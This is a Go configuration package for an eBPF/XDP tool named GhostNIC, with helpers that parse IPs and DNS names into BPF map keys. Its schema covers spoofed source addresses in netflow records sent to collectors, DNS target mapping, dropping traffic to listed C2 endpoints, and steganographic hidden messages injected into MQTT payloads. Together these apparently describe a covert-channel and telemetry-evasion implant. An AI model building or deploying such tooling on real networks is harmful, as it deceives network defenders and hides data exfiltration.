// Package config defines the runtime configuration schema for GhostNIC and
// provides helpers for populating BPF maps from a JSON configuration file.
package config

import (
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"
	"os"
	"strings"
)

// Constants mirrored from bpf/common.h so Go validation matches kernel limits.
const (
	DNSMaxName     = 255
	MQTTHiddenMax  = 256               // bytes in mqtt_hidden map
	MQTTPayloadMax = MQTTHiddenMax - 1 // one byte is reserved for length prefix
	MaxPayloadScan = 512
)

// NetflowTarget describes a collector that should receive sanitized flows.
type NetflowTarget struct {
	Address string `json:"address"` // collector IPv4 address
	Port    uint16 `json:"port"`    // collector L4 port
	Spoof   string `json:"spoof"`   // benign source IPv4 address to substitute
}

// Baseline is the size envelope used to gate MQTT payload injection.
type Baseline struct {
	Average uint32 `json:"average"` // bytes
	Window  uint32 `json:"window"`  // +/- bytes
}

// Encoder holds the steganographic key and mode.
type Encoder struct {
	Key  uint32 `json:"key"`
	Mode uint32 `json:"mode"` // 0 = LSB parity
}

// C2Target describes an endpoint whose outbound TCP SYNs should be dropped.
type C2Target struct {
	Address string `json:"address"`
	Port    uint16 `json:"port"`
}

// Config is the top-level loader configuration.
type Config struct {
	Interface   string            `json:"interface"`
	DNSTargets  map[string]string `json:"dns_targets"`
	DNS6Targets map[string]string `json:"dns6_targets"`
	Netflow     []NetflowTarget   `json:"netflow_collectors"`
	C2          []C2Target        `json:"c2_targets"`
	MQTT        Baseline          `json:"mqtt_baseline"`
	Encoder     Encoder           `json:"mqtt_encoder"`
	HiddenMsg   string            `json:"mqtt_hidden_message"`
}

// Default returns a minimal usable GhostNIC configuration.
func Default() *Config {
	return &Config{
		Interface: "eth0",
	}
}

// Load reads a GhostNIC JSON configuration from disk.  If path is empty or the
// file does not exist, it returns a default configuration so that CLI flags can
// fully specify the load parameters.
func Load(path string) (*Config, error) {
	if path == "" {
		return Default(), nil
	}
	b, err := os.ReadFile(path)
	if err != nil {
		if os.IsNotExist(err) {
			return Default(), nil
		}
		return nil, fmt.Errorf("read config %q: %w", path, err)
	}
	var cfg Config
	if err := json.Unmarshal(b, &cfg); err != nil {
		return nil, fmt.Errorf("parse config %q: %w", path, err)
	}
	if cfg.Interface == "" {
		return nil, fmt.Errorf("interface is required")
	}
	if len(cfg.HiddenMsg) > MQTTPayloadMax {
		return nil, fmt.Errorf("hidden message exceeds %d bytes", MQTTPayloadMax)
	}
	return &cfg, nil
}

// ParseIPv4 converts a dotted IPv4 string to a big-endian uint32.
func ParseIPv4(s string) (uint32, error) {
	ip := net.ParseIP(s)
	if ip == nil {
		return 0, fmt.Errorf("invalid IP %q", s)
	}
	v4 := ip.To4()
	if v4 == nil {
		return 0, fmt.Errorf("not an IPv4 address %q", s)
	}
	return binary.BigEndian.Uint32(v4), nil
}

// ParseIPv6 converts a colon-separated IPv6 string to a 16-byte array.
func ParseIPv6(s string) ([16]byte, error) {
	ip := net.ParseIP(s)
	if ip == nil {
		return [16]byte{}, fmt.Errorf("invalid IP %q", s)
	}
	v6 := ip.To16()
	if v6 == nil {
		return [16]byte{}, fmt.Errorf("not an IPv6 address %q", s)
	}
	var out [16]byte
	copy(out[:], v6)
	return out, nil
}

// PackDNSKey converts a dot-separated domain name into the wire-format
// fixed-size key used by the XDP dns_targets hash map.
func PackDNSKey(name string) ([DNSMaxName]byte, error) {
	if len(name) >= DNSMaxName {
		return [DNSMaxName]byte{}, fmt.Errorf("domain name too long: %q", name)
	}
	var k [DNSMaxName]byte
	off := 0
	labels := strings.Split(name, ".")
	for _, label := range labels {
		if len(label) > 63 {
			return [DNSMaxName]byte{}, fmt.Errorf("DNS label too long: %q", label)
		}
		k[off] = byte(len(label))
		off++
		copy(k[off:], label)
		off += len(label)
	}
	// terminating zero already present in zeroed array
	return k, nil
}

// ToJSON returns a compact JSON representation for logging.
func (c *Config) ToJSON() ([]byte, error) {
	return json.MarshalIndent(c, "", "  ")
}
